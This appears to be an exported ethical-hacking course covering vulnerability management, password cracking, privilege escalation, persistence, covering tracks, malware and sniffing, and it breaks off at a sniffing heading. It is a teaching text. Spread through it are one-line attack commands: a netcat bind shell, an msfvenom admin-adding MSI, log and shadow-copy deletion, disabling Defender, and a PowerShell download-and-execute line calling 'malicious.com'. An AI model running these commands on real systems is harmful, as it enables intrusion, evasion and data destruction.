Vulnerability management is not a one-time scan but a continuous, cyclical process designed to identify, evaluate, treat, and report on security vulnerabilities in systems and the software that runs on them. The typical lifecycle includes:

  1. Discovery/Inventory: Identifying all assets on the network. You cannot secure what you do not know exists.
  2. Vulnerability Scanning: Actively probing the assets for known flaws using automated tools.
  3. Assessment/Prioritization: Evaluating the results of the scan. Not all vulnerabilities pose the same risk. This step involves correlating vulnerabilities with threat intelligence and asset criticality to determine which flaws need immediate attention.
  4. Remediation: Fixing the vulnerability. This is most commonly done by applying a software patch, but can also involve changing a configuration, disabling a service, or implementing a compensating control.
  5. Verification: Re-scanning the affected systems to confirm that the remediation was successful and the vulnerability no longer exists.
  6. Reporting: Documenting the current security posture, the actions taken, and tracking metrics over time.

1.2 Key Terminology

  • Vulnerability: A weakness in a system's design, implementation, or operation and management that could be exploited to compromise the system's security.
  • Exploit: A piece of software, a chunk of data, or a sequence of commands that takes advantage of a bug or vulnerability to cause unintended or unanticipated behavior.
  • Zero-Day Vulnerability: A vulnerability that is completely unknown to the software vendor and the general public. Because there is no patch available, it poses a severe threat.

topics.title: CVSS and Vulnerability Databases
topics.content:
2.1 The Common Vulnerability Scoring System (CVSS)

CVSS is a free and open industry standard for assessing the severity of computer system security vulnerabilities. It attempts to assign severity scores to vulnerabilities, allowing responders to prioritize responses and resources according to threat. Scores range from 0.0 to 10.0.

A CVSS score is composed of three metric groups:

  • Base Score: Represents the intrinsic qualities of a vulnerability that are constant over time and across user environments. It looks at factors like the Attack Vector (network vs. local), Attack Complexity (high vs. low), Privileges Required, User Interaction, and the impact on the CIA triad.
  • Temporal Score: Reflects the characteristics of a vulnerability that change over time, such as the availability of exploit code or the existence of an official patch.
  • Environmental Score: Customizes the CVSS score to a specific user's environment, taking into account factors like the importance of the affected IT asset to a business organization.

2.2 Vulnerability Databases

Security professionals rely on centralized repositories to stay informed about newly discovered vulnerabilities:

  • CVE (Common Vulnerabilities and Exposures): A dictionary of publicly known information security vulnerabilities and exposures. Each vulnerability is assigned a unique CVE identifier (e.g., CVE-2021-44228 for Log4Shell).
  • NVD (National Vulnerability Database): The U.S. government repository of standards-based vulnerability management data, represented using the Security Content Automation Protocol (SCAP). The NVD synchronizes with the CVE list and provides additional analysis, such as CVSS scores.
  • Exploit-DB: A database of public exploits and vulnerable software, maintained by Offensive Security. It is an invaluable resource for penetration testers looking for proof-of-concept exploit code.

topics.title: Scanning Techniques and Tools
topics.content:
3.1 Types of Vulnerability Scans

Vulnerability scanning can be performed in different ways, each offering varying levels of depth and accuracy:

  • Unauthenticated Scans (Network-based): The scanner probes the target from the perspective of an outside attacker without logging into the system. It can only detect vulnerabilities in services that are exposed to the network (e.g., an outdated web server on port 80). It is quick but superficial.
  • Authenticated Scans (Credentialed Scans): The scanner is provided with administrative credentials (e.g., SSH keys for Linux, Windows domain admin credentials). The scanner logs into the target system and performs a deep inspection of the local registry, file system, installed software versions, and local security policies. This method is far more accurate, finds significantly more vulnerabilities, and dramatically reduces false positives.
  • Agent-based Scanning: Instead of scanning over the network, a lightweight software agent is installed on the target endpoint. The agent performs local scans and reports the findings back to a central management console. This is highly effective for roaming devices (laptops) that are not always on the corporate network.

3.2 Prominent Vulnerability Scanning Tools

The market is populated with robust enterprise and open-source tools:

  • Nessus (Tenable): One of the most widely used proprietary vulnerability scanners. Known for its extensive plugin database and accurate credentialed scanning capabilities.
  • OpenVAS (Greenbone): A popular open-source alternative to Nessus. It offers a comprehensive vulnerability scanning engine and a web-based interface.
  • QualysGuard: A cloud-based vulnerability management platform widely used in large enterprises for continuous monitoring and compliance reporting.
  • Nexpose/InsightVM (Rapid7): Known for its strong integration with the Metasploit framework, allowing for seamless transition from vulnerability discovery to exploitation.

topics.title: Analyzing Scan Results
topics.content:
4.1 Interpreting the Output

Running a vulnerability scanner is the easy part; the real challenge lies in analyzing the often voluminous reports. A typical report will categorize findings by severity (Critical, High, Medium, Low, Informational) based on CVSS scores.

4.2 False Positives and False Negatives

  • False Positive: The scanner reports a vulnerability that does not actually exist or is not exploitable in that specific environment. For example, a scanner might flag an outdated version of Apache based solely on the HTTP banner, but the administrator may have manually backported the security patch without updating the version number string. Analysts must manually verify high-severity findings to weed out false positives.
  • False Negative: The scanner fails to detect a vulnerability that actually exists. This is dangerous because it provides a false sense of security. False negatives can occur if the scanner's plugin database is outdated, if the scan was unauthenticated, or if the vulnerability is a custom flaw (like a zero-day or a specific business logic flaw in a web application).

4.3 Prioritization and Remediation Strategy

Organizations cannot patch everything immediately. Remediation must be prioritized based on risk:

  • Internet-Facing Systems: Systems exposed to the internet with critical vulnerabilities (especially those with known public exploits) must be patched immediately.
  • Asset Criticality: A vulnerability on a domain controller or a database holding customer PII takes precedence over the same vulnerability on an isolated print server.
  • Compensating Controls: If a patch cannot be applied immediately (e.g., it breaks a legacy application), compensating controls must be implemented. For example, deploying a Web Application Firewall (WAF) rule to block exploit attempts against a vulnerable web application until the underlying code can be fixed.

modules.title: System Hacking
modules.description: Covers the core techniques for compromising systems including password cracking, privilege escalation, maintaining persistent access, steganography, and covering tracks.
objectives: Understand password cracking techniques and tools
Perform horizontal and vertical privilege escalation
Establish persistent access using backdoors and rootkits
Hide data using steganography and alternate data streams
Clear tracks by modifying logs and timestamps

topics.title: Password Cracking Techniques
topics.content:
Password cracking is a cornerstone of system hacking. It involves recovering plain-text passwords from their hashed or encrypted forms, or directly guessing them through various online and offline techniques.

Online vs. Offline Cracking

Online Cracking involves attacking the authentication service directly over the network. This includes protocols like SSH, FTP, RDP, or HTTP forms. Tools like Hydra, Medusa, and Ncrack are standard. For example, a command like hydra -L users.txt -P passwords.txt ssh://192.168.1.100 -t 4 uses Hydra to test user/password combinations from text files against an SSH server using 4 parallel threads. Online cracking is loud, easily detectable by Intrusion Detection Systems (IDS), and risks triggering account lockouts if threshold policies are enforced.

Offline Cracking is much preferred by attackers. It involves stealing the password database or hashes and cracking them locally on the attacker's hardware. This bypasses account lockout policies and network detection. The speed is only limited by the attacker's computational power (often augmented by GPU clusters). Popular tools include John the Ripper and Hashcat.

Types of Attacks

  • Brute Force Attack: The most comprehensive but slowest method. It attempts every possible character combination (e.g., all combinations of a-z, A-Z, 0-9). While guaranteed to eventually find the password, it mathematically scales exponentially and becomes unfeasible for passwords longer than 8-10 characters.
  • Dictionary Attack: Uses a precompiled list of common words (like the famous rockyou.txt). This is extremely fast and effective against weak passwords.
  • Rule-based Attack (Mangling): Enhances dictionary attacks by applying rules to words (e.g., adding "123" to the end, substituting 'a' with '@', or capitalizing the first letter). In Hashcat, this might look like hashcat -m 1000 hashes.txt wordlist.txt -r rules/best64.rule.
  • Rainbow Tables: Precomputed tables of hashes for all possible plaintext passwords within a certain character space. They trade computation time for storage space. However, modern systems use salts (random data appended to the password before hashing) to defeat rainbow tables.

Windows Authentication and Mimikatz

In Windows environments, local hashes are stored in the Security Account Manager (SAM) database located at C:\Windows\System32\config\SAM. Attackers often attempt to dump the SAM database using tools like reg save HKLM\SAM sam.save (if they have admin privileges).

Mimikatz is a post-exploitation tool heavily featured in CEH. It extracts plaintext passwords, hashes, PIN codes, and kerberos tickets from memory (specifically the LSASS process). A primary attack is Pass-the-Hash (PtH), where an attacker extracts an NTLM hash and uses it to authenticate to other network resources without ever needing to know or crack the plaintext password. Another advanced technique is Overpass-the-Hash (Pass-the-Key), which uses an NTLM hash to request a Kerberos Ticket Granting Ticket (TGT), allowing the attacker to interact with Active Directory services via Kerberos.

topics.title: Privilege Escalation
topics.content:
After an attacker gains a foothold (initial access), they usually have low-level user privileges. Privilege Escalation is the act of exploiting bugs, design flaws, or configuration oversights to gain elevated access (Administrator or SYSTEM on Windows, root on Linux).

Vertical vs. Horizontal Escalation

Vertical Escalation is moving from a low-privileged account to a high-privileged account (e.g., standard user to root). Horizontal Escalation involves taking over an account with the same privilege level (e.g., User A compromising User B's account) to access different files or pivot through the network.

Linux Privilege Escalation Techniques

  • Kernel Exploits: If a system is unpatched, attackers can compile and run exploits against kernel vulnerabilities (e.g., Dirty COW - CVE-2016-5195) to instantly spawn a root shell.
  • SUID/SGID Binaries: A binary with the SUID (Set Owner User ID up on execution) bit set runs with the privileges of its owner (often root) rather than the user executing it. Attackers search for these files using commands like find / -perm -u=s -type f 2>/dev/null. If a custom or standard binary (like nmap, vim, or bash) has the SUID bit set and allows executing commands or reading files, it can be abused for root access.
  • Sudo Rights Misconfiguration: Attackers check what commands they can run as root using sudo -l. If a user can run sudo less /var/log/syslog, they can open the log, type !sh, and drop into a root shell.
  • World-Writable Files: The /etc/passwd file should be readable by all, but writable only by root. If misconfigured as world-writable, an attacker can generate a password hash (using openssl passwd -1 password123) and add a new user with root privileges (UID 0) directly into the file.

Windows Privilege Escalation Techniques

  • Unquoted Service Paths: If a service path contains spaces and is unquoted (e.g., C:\Program Files\My Service\service.exe), Windows will attempt to execute C:\Program.exe before C:\Program Files\My.exe, and finally the actual service. If a directory in that path has weak write permissions, an attacker can place a malicious executable named Program.exe, which will run with SYSTEM privileges when the service restarts.
  • Weak Service Permissions: If a low-privileged user has the ability to modify a service configuration (e.g., change the binPath), they can point the service to a malicious executable. Tools like PowerUp.ps1 or WinPEAS are used to automate the discovery of these misconfigurations.
  • AlwaysInstallElevated: If this registry setting is enabled, any user can run MSI installer packages with SYSTEM privileges. Attackers can generate a malicious MSI using Metasploit (msfvenom -p windows/x64/exec CMD="net localgroup administrators user /add" -f msi -o setup.msi) and execute it.

topics.title: Maintaining Access
topics.content:
Once administrative access is achieved, the attacker's next priority is Persistence (maintaining access). This ensures they can reconnect to the compromised system even if it is rebooted, if passwords are changed, or if the initial vulnerability is patched.

Backdoors and Trojans

Attackers install backdoors to bypass normal authentication mechanisms. This could be a simple Netcat relay (e.g., setting up a bind shell listening on a hidden port with nc -lvnp 4444 -e /bin/bash) or a fully featured Remote Access Trojan (RAT) that communicates back to the attacker's Command and Control (C2) server.

Rootkits

Rootkits are highly sophisticated malware designed not just to provide backdoor access, but to actively hide their presence and other malicious artifacts from the operating system, administrators, and security tools. They achieve this by hooking core system functions.

  • User-Mode Rootkits: Operate at Ring 3 (user space). They hook APIs like FindFirstFile in Windows or intercept calls to ls and ps in Linux to hide malicious files and processes.
  • Kernel-Mode Rootkits: Operate at Ring 0 (kernel space). They are much more powerful and dangerous because they have the same privileges as the operating system itself. They can modify kernel structures, hook System Service Dispatch Tables (SSDT), and are notoriously difficult to detect because they can lie to the antivirus software itself.

Persistence Mechanisms in Windows

  • Registry Run Keys: The most common persistence method. Attackers add entries to HKCU\Software\Microsoft\Windows\CurrentVersion\Run or HKLM\...\Run to execute malware every time a user logs in or the system boots.
  • Scheduled Tasks: Creating scheduled tasks via the command line (schtasks /create /tn "UpdateCheck" /tr "C:\Temp\malware.exe" /sc onstart /ru SYSTEM) is a stealthy way to maintain persistence running as the highly privileged SYSTEM account.
  • WMI Event Subscriptions: Advanced attackers use Windows Management Instrumentation (WMI) to trigger malicious actions based on system events (e.g., executing a PowerShell payload whenever a user logs in). This is often entirely fileless.

topics.title: Steganography
topics.content:
Steganography is the art and science of writing hidden messages in such a way that no one, apart from the sender and intended recipient, suspects the existence of the message. While cryptography scrambles the message, steganography hides the message entirely.

Techniques and Methods

  • Least Significant Bit (LSB) Insertion: This is the most common technique for image and audio steganography. Every pixel in a digital image is represented by bytes of data (e.g., RGB values). By altering the very last bit (the least significant bit) of these bytes to encode the secret message, the overall color changes so minutely that it is imperceptible to the human eye. However, the data can be extracted by an algorithm.
  • Whitespace Steganography: Adding hidden spaces or tabs at the end of lines in text documents or HTML code. The visual document remains identical, but the whitespace encodes binary data.
  • Alternate Data Streams (ADS): A feature of the NTFS file system on Windows designed to store metadata. Attackers abuse ADS to hide malicious executables or data behind legitimate files. For example, the command type malware.exe > normal_file.txt:hidden.exe hides the malware. It does not change the size of normal_file.txt as displayed in Windows Explorer, making it highly evasive. The hidden file can then be executed via tools like WMI or creating a symlink.

Steganography Tools

Attackers and penetration testers utilize various tools to embed and extract steganographic data:

  • Steghide: A command-line tool that can hide data in various image and audio formats. Example to embed: steghide embed -ef secret.txt -cf cover.jpg. Example to extract: steghide extract -sf cover.jpg.
  • OpenStego: A graphical steganography application that uses encryption along with data hiding.
  • Snow: A command-line tool specifically designed for whitespace steganography in text files.

topics.title: Covering Tracks
topics.content:
The final phase of a successful cyberattack is covering tracks. This involves wiping evidence of the attack, deleting logs, modifying timestamps, and removing any temporary tools left behind to evade detection by Incident Response (IR) teams and forensic analysts.

Log Deletion and Modification

In Windows, the primary target is the Event Logs (Security, System, and Application). Attackers with administrative privileges will often clear these entirely. A common command used is wevtutil cl Security to clear the Security log, or via PowerShell: Clear-EventLog -LogName Security, System. If the attacker is using the Metasploit Framework, they will simply run the clearev command from the Meterpreter shell to wipe all major Windows logs simultaneously.

In Linux, attackers must clear their command history and system logs. Typical commands include export HISTSIZE=0 (to prevent current session commands from being logged), cat /dev/null > ~/.bash_history (to empty the history file), and clearing files in /var/log/ such as auth.log or syslog using utilities like shred to securely overwrite the data rather than just deleting it.

Timestomping

Digital forensics relies heavily on the MACE (Modified, Accessed, Created, Entry Modified) timestamps of files to construct a timeline of the attack. Timestomping is the act of maliciously altering these timestamps to confuse investigators. For example, an attacker might change the creation date of their malware to match legitimate system files from 5 years ago. On Linux, this is easily done with the touch command: touch -r /bin/ls /tmp/malware will copy the exact timestamps from /bin/ls to the malware file. On Windows, Meterpreter has a built-in timestomp command.

Disabling Auditing and Security Controls

To prevent future actions from being logged while they maintain persistence, attackers will frequently disable system auditing. On Windows, this involves manipulating Group Policy or using auditpol /set /category:"Logon/Logoff" /success:disable /failure:disable. Furthermore, they will attempt to disable Windows Defender (e.g., Set-MpPreference -DisableRealtimeMonitoring $true) or add exclusions to the directories where their malware is hidden.

Deleting Volume Shadow Copies

Particularly prevalent in ransomware attacks, destroying backups is a critical step in covering tracks and ensuring data destruction. Attackers routinely execute vssadmin.exe Delete Shadows /All /Quiet or wmic shadowcopy delete to permanently destroy Windows Volume Shadow Copies, preventing the system administrator from easily restoring encrypted or deleted files.

modules.title: Malware Threats
modules.description: Examines types of malware including viruses, worms, Trojans, ransomware, and APTs. Covers malware analysis techniques and evasion strategies.
objectives: Classify different types of malware and their characteristics
Understand Advanced Persistent Threats (APTs) and their lifecycle
Explain fileless malware techniques and evasion methods
Perform basic static and dynamic malware analysis
Identify anti-malware countermeasures and solutions

topics.title: Malware Types and Characteristics
topics.content:
Malware (Malicious Software) is an umbrella term encompassing various types of intrusive, disruptive, or destructive software. Understanding their specific characteristics is vital for classification and defense.

Viruses vs. Worms

A Virus is malicious code that attaches itself to a legitimate host file or boot sector. It requires human interaction (e.g., executing the infected file, opening a macro-enabled document) to trigger the payload and replicate to other files. In contrast, a Worm is a standalone program that self-replicates and spreads rapidly across networks by actively exploiting vulnerabilities, completely independently of user action. The 2017 WannaCry attack was a devastating worm that utilized the EternalBlue exploit (SMBv1 vulnerability) to infect hundreds of thousands of computers globally within days.

Trojans and Backdoors

Named after the wooden horse of Troy, a Trojan disguises itself as desirable, benign software (like a game or utility) to trick the user into installing it. Unlike viruses and worms, Trojans typically do not self-replicate. Once executed, they often open a backdoor to the system, creating a Remote Access Trojan (RAT). This allows the attacker full administrative control over the victim's machine, enabling them to steal data, turn on webcams, or pivot to other network segments.

Ransomware and Extortion

Ransomware employs cryptography to hold a victim's data or systems hostage. Traditional ransomware encrypts files and demands a cryptocurrency payment for the decryption key. Modern operations utilize Double Extortion: the attacker first exfiltrates sensitive corporate data, then encrypts the local systems. If the organization refuses to pay to decrypt the files (e.g., because they have backups), the attacker threatens to publicly leak the stolen data on the dark web, triggering massive regulatory fines and reputational damage. Triple Extortion adds a layer of DDoS attacks against the victim to force compliance.

Droppers and Downloaders

These are first-stage payloads designed to be small, evasive, and highly customized. Their sole purpose is to establish initial execution, bypass antivirus by containing no inherently destructive code, reach out to a Command and Control (C2) server, and download the actual second-stage malware (like a banking Trojan or Ransomware). This modular approach helps attackers evade detection at the perimeter.

topics.title: Advanced Persistent Threats (APTs)
topics.content:
Advanced Persistent Threats (APTs) are a completely different caliber of cyber threat compared to opportunistic malware. They represent coordinated, highly sophisticated, and stealthy campaigns conducted by well-resourced groups, often state-sponsored (nation-state actors) or elite organized crime syndicates.

Characteristics of APTs

APTs are characterized by their specific targeting (e.g., a specific defense contractor or a critical infrastructure facility) and their long dwell time. Dwell time is the duration an attacker remains undetected within a network. While a noisy ransomware attack is immediately obvious, an APT operates "low and slow." They might dwell in a network for 12 to 18 months, meticulously mapping the infrastructure, compromising highly privileged credentials, and identifying where the "crown jewels" (intellectual property, state secrets, financial data) are stored.

The APT Lifecycle

The operational flow of an APT typically follows a structured lifecycle, heavily aligned with frameworks like the Lockheed Martin Cyber Kill Chain or MITRE ATT&CK:

  1. Reconnaissance: Extensive intelligence gathering on the target organization, identifying employees, technologies used, and potential attack vectors.
  2. Initial Compromise: Often achieved through highly tailored spear-phishing, exploiting a zero-day vulnerability in an edge device (like a VPN appliance), or a supply chain attack.
  3. Establish Foothold: Deploying stealthy malware to ensure persistence (surviving reboots and password changes).
  4. Privilege Escalation: Moving from standard user access to Domain Admin to control the entire network.
  5. Internal Reconnaissance & Lateral Movement: Silently exploring the network, moving from the initially compromised endpoint to servers hosting critical data. This is often done using legitimate administrative tools (like RDP, SMB, WMI) to blend in with normal traffic.
  6. Maintain Presence: Creating alternative communication channels and backdoors to ensure access even if the primary C2 server is discovered.
  7. Data Exfiltration: The ultimate goal. Data is compressed, encrypted, and slowly siphoned out of the network (often via DNS tunneling or over HTTPS to compromised cloud storage) to avoid triggering data loss prevention (DLP) alerts.

topics.title: Fileless Malware and LOLBins
topics.content:
Traditional antivirus software relies heavily on scanning executable files written to the hard drive and comparing them against a database of known malicious signatures. Fileless malware fundamentally bypasses this defense mechanism by operating almost entirely in the computer's volatile memory (RAM), leaving no traditional malware files on the disk.

Living off the Land (LOLBins)

To execute code without bringing external malware files into the system, attackers rely on Living off the Land Binaries (LOLBins). These are legitimate, trusted, and built-in administration tools provided by the operating system (like PowerShell, WMI, mshta.exe, certutil.exe). Because they are trusted components, they are not blocked by Application Whitelisting or Antivirus.

For example, an attacker might send a phishing email with a Word document. The document contains a macro that, when executed, runs a command like: powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')". This command forces PowerShell to download a malicious script from the internet and execute it directly in memory. No executable file ever touches the hard drive.

WMI and Registry Persistence

To maintain persistence without files, fileless malware often stores its payload in the Windows Registry (which is extremely difficult to scan comprehensively) or uses Windows Management Instrumentation (WMI) event subscriptions. A WMI subscription can be configured to execute a malicious PowerShell script stored entirely in a registry key every time the system boots up or a specific user logs in. This creates an incredibly stealthy, persistent threat that survives reboots despite existing only in memory when running.

Detection and Countermeasures

Detecting fileless malware requires shifting from signature-based scanning to Behavioral Analysis. Endpoint Detection and Response (EDR) solutions monitor the actions of processes. For example, if MS Word suddenly spawns PowerShell, which then attempts to make an outbound network connection, the EDR will flag this as highly suspicious behavior, regardless of whether a file was written to disk.

topics.title: Malware Analysis Techniques
topics.content:
Malware analysis is the process of dissecting malicious software to understand its behavior, identify indicators of compromise (IOCs), and develop effective defenses and signatures. It is broadly divided into Static and Dynamic analysis.

Static Analysis

Static analysis involves examining the malware without actually executing it. It is safer but limited if the malware is heavily obfuscated.

  • File Fingerprinting: Calculating the MD5, SHA-1, or SHA-256 hash of the file and checking it against databases like VirusTotal to see if it is a known threat.
  • String Extraction: Using tools like the strings command (e.g., strings malware.exe > output.txt) to extract readable ASCII and Unicode characters from the binary. This often reveals hardcoded IP addresses, URLs, registry keys, and API calls used by the malware.
  • PE Header Analysis: Analyzing the Portable Executable (PE) header of Windows binaries using tools like PEview. The header reveals compile times, imported DLLs, and functions. If a binary imports InternetOpenUrl, it likely downloads a payload. If it imports SetWindowsHookEx, it might be a keylogger.
  • Reverse Engineering: The most advanced form of static analysis. It involves using disassemblers (like IDA Pro or Ghidra) to translate the compiled machine code back into assembly language, allowing analysts to trace the exact logic and algorithms of the malware.

Dynamic Analysis (Behavioral Analysis)

Dynamic analysis involves running the malware in a controlled, isolated environment and observing what it does. This environment is typically a heavily monitored Virtual Machine called a Sandbox (e.g., Cuckoo Sandbox or ANY.RUN).

During execution, analysts monitor the following using tools like Sysinternals Suite:

  • File System Activity: Using Process Monitor (Procmon) to see what files the malware creates, deletes, or modifies.
  • Registry Activity: Monitoring for new run keys or modifications to security settings (like disabling the Windows firewall).
  • Network Activity: Using a network sniffer like Wireshark to capture all DNS requests, HTTP traffic, and connections to C2 servers. This is critical for identifying malicious domains and IPs to block at the firewall.

topics.title: Malware Evasion and Countermeasures
topics.content:
Malware authors are in a constant arms race with security vendors. They employ sophisticated evasion techniques to bypass detection and hinder analysis.

Evasion Techniques

  • Obfuscation and Packers: Attackers use software packers (like UPX) and crypters to compress and encrypt the malicious payload. The outer layer of the executable is a simple unpacking routine. The actual malware is only decrypted in memory at runtime. This completely changes the file signature, making static signature-based detection useless.
  • Polymorphism and Metamorphism: Polymorphic malware changes its decryptor routine or encryption key every time it infects a new system, altering its signature. Metamorphic malware is much more complex; it completely rewrites its own code (e.g., substituting instructions with equivalents, adding junk code) while maintaining the exact same functionality. It has no static signature.
  • Anti-VM and Anti-Debugging (Sandbox Evasion): Advanced malware includes logic to detect if it is running in an analyst's sandbox. It might check for specific registry keys, MAC addresses assigned to VMware/VirtualBox, the presence of analysis tools (like Wireshark or Procmon), or even wait for mouse movement or human interaction before executing. If it detects a sandbox, it will terminate itself or execute a benign, decoy payload.

Countermeasures

Traditional Antivirus is no longer sufficient against modern threats. A defense-in-depth approach is required:

  • Endpoint Detection and Response (EDR): EDR solutions utilize machine learning and behavioral analytics to monitor process execution paths, API calls, and memory anomalies in real-time, effectively blocking fileless malware and zero-day exploits.
  • Network Segmentation: Dividing the network into isolated segments (VLANs) with strict firewall rules prevents worms and ransomware from easily spreading laterally across an entire organization.
  • Principle of Least Privilege (PoLP): Ensuring users only have the permissions necessary for their job. Removing local administrator rights from end-users prevents the majority of malware from successfully installing rootkits or modifying system-wide settings.
  • Application Whitelisting: Unlike antivirus (which blocks known bad), whitelisting (using tools like Windows AppLocker) blocks everything by default and only allows explicitly approved, cryptographically signed applications to run.

modules.title: Sniffing
modules.description: Covers packet sniffing concepts, network traffic analysis, and attacks on network infrastructure including MAC flooding, ARP spoofing, DHCP starvation, and DNS spoofing.
objectives: Understand active and passive sniffing concepts
Perform network traffic analysis using Wireshark and tcpdump
Execute MAC flooding and CAM table exhaustion attacks
Perform ARP spoofing, DHCP starvation, and DNS poisoning
Implement network sniffing countermeasures

topics.title: Packet Sniffing Concepts
topics.content:
Packet sniffing is the process of capturing, decoding, and analyzing network traffic as it traverses a network. It is a dual-use technology: network administrators use it for troubleshooting and security monitoring, while attackers use it to steal unencrypted credentials (like Telnet, FTP, or HTTP passwords), intercept sensitive data, and map network topologies.

Passive vs. Active Sniffing

The method of sniffing depends entirely on the underlying network hardware.

Passive Sniffing occurs in networks that utilize Hubs. A hub operates at Layer 1 (Physical Layer) and simply takes any electrical signal received on one port and broadcasts it out to all other ports. In a hubbed environment, every computer sees all network traffic. To sniff this traffic, an attacker merely needs to configure their Network Interface Card (NIC) to operate in Promiscuous Mode. Normally, a NIC ignores packets not destined for its own MAC address; promiscuous mode forces the NIC to process every packet it "hears" on the wire. This is completely passive, generates no additional traffic, and is undetectable by the network.

Active Sniffing is required in modern networks that use Switches. A switch operates at Layer 2 (Data Link Layer). It learns which MAC addresses are connected to which ports and intelligently forwards frames only to the specific port of the intended destination. Therefore, in a switched network, an attacker in promiscuous mode will only see broadcast traffic, multicast traffic, and traffic specifically directed to their own machine. To capture traffic between other hosts, the attacker must actively inject malicious packets to manipulate the switch's behavior (e.g., via MAC Flooding or ARP Spoofing). Active sniffing is "loud" and easily detectable by Intrusion Detection Systems.

SPAN and Mirror Ports
